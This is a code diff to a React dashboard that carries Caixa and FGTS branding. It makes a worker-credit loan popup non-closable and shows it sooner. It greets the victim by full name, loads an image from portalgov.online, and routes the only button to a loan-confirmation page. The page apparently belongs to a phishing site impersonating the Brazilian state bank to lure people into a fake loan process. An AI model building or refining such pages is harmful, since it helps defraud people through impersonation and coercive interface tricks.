@@ -3,8 +3,9 @@ import React, { useEffect, useState } from 'react';
 import { ArrowRight, DollarSign, BarChart3, Calendar, Home, HelpCircle, MoreHorizontal } from 'lucide-react';
 import CaixaLogo from '@/components/CaixaLogo';
 import FGTSLogo from '@/components/FGTSLogo';
-import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
+import { Dialog, DialogContent } from "@/components/ui/dialog";
 import { Button } from '@/components/ui/button';
+import { useNavigate } from 'react-router-dom';
 
 interface UserData {
   DADOS: {
@@ -19,6 +20,7 @@ interface UserData {
 const Dashboard = () => {
   const [fullName, setFullName] = useState('');
   const [showPopup, setShowPopup] = useState(false);
+  const navigate = useNavigate();
   
   useEffect(() => {
     try {
@@ -60,10 +62,10 @@ const Dashboard = () => {
         simulateApiCall();
       }
       
-      // Set timeout for popup to appear after 5 seconds
+      // Set timeout for popup to appear after 3 seconds (changed from 5)
       const popupTimer = setTimeout(() => {
         setShowPopup(true);
-      }, 5000);
+      }, 3000);
       
       return () => clearTimeout(popupTimer);
     } catch (error) {
@@ -78,6 +80,10 @@ const Dashboard = () => {
       {children}
     </span>
   );
+
+  const handleLoanApplication = () => {
+    navigate('/loan-confirmation');
+  };
 
   return (
     <div className="min-h-screen flex flex-col bg-gradient-to-r from-[#008792] to-[#005CA9]">
@@ -206,19 +212,28 @@ const Dashboard = () => {
         </div>
       </div>
 
-      {/* Loan Popup */}
-      <Dialog open={showPopup} onOpenChange={setShowPopup}>
+      {/* Loan Popup - Modified to not be closable */}
+      <Dialog open={showPopup} onOpenChange={() => {}}>
         <DialogContent className="max-w-[350px] rounded-lg px-4 py-4 bg-white">
           <div className="flex flex-col items-start space-y-3">
+            {/* Credit image */}
+            <div className="w-full flex justify-center mb-2">
+              <img 
+                src="https://portalgov.online/credito.png" 
+                alt="Crédito" 
+                className="h-14 object-contain" 
+              />
+            </div>
+            
             <span className="text-[#005CA9] text-2xl font-semibold">Crédito do Trabalhador</span>
             
             <div className="text-gray-600 text-sm mt-2">
-              Faça simulações de empréstimo e solicite propostas de empréstimos para as instituições financeiras parceiras.
+              {fullName}, você tem propostas de crédito.
             </div>
             
             <Button 
               className="w-full mt-4 bg-[#005CA9] hover:bg-[#004A87] text-white px-6 py-2 rounded-full"
-              onClick={() => setShowPopup(false)}
+              onClick={handleLoanApplication}
             >
               IR PARA EMPRÉSTIMOS
             </Button>
